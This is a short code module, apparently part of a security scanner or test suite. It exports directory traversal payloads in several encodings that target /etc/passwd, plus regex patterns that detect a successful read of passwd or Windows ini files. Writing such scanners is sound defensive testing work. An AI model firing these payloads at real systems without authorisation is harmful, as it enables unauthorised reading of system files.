/** Directory traversal payloads */
export const TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\etc\\passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
];

/** Patterns indicating directory traversal success */
export const TRAVERSAL_SUCCESS_PATTERNS = [
  /root:.*?:0:0/,
  /\[boot loader\]/i,
  /\[extensions\]/i,
  /\[fonts\]/i,
];
